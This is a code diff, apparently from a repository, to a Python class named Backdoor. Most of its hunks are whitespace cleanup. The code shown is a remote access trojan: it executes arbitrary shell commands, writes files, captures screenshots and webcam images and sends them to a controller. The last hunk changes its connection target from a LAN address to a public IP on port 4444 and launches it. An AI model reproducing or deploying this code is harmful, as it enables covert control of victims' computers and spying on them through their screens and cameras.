@@ -26,7 +26,7 @@ class Backdoor:
                 return json.loads(json_data)
             except ValueError:
                 continue
-    
+
     def execute_system_command(self, command):
         try:
             return subprocess.getoutput(command) #.decode("utf-8")
@@ -39,8 +39,8 @@ class Backdoor:
             return "[+] Changing working directory to " + path
         except:
             return f"[-] No such file or directory: '{path}'"
-        
-    
+
+
     def write_file(self, path, content):
         content = base64.b64decode(content)
         with open(path, "wb") as file:
@@ -72,7 +72,7 @@ class Backdoor:
                 elif command.split()[0] == "screenshot":
                     im = mss.mss().shot(output="screen.png")
                     command_result = self.read_file("screen.png")
-                    
+
                     if os.name == "nt":
                         os.system("del screen.png")
                     else:
@@ -82,25 +82,20 @@ class Backdoor:
                     result, image = cam.read()
                     cv2.imwrite("camera.jpg", image)
                     command_result = self.read_file("camera.jpg")
-                    
+
                     if os.name == "nt":
                         os.system("del camera.jpg")
                     else:
                         os.system("rm camera.jpg")
-                    
+
                     cam.release()
                 else:
-                    command_result = self.execute_system_command(command)                                   
+                    command_result = self.execute_system_command(command)
                 self.reliable_send(command_result)
             except Exception as error:
                 self.reliable_send(error)
                 # self.reliable_send("[-] Something was wrong!")
 
 
-my_backdoor = Backdoor("192.168.0.101", 4444)
+my_backdoor = Backdoor("185.247.119.121", 4444)
 my_backdoor.run()
-
-
-
-
-
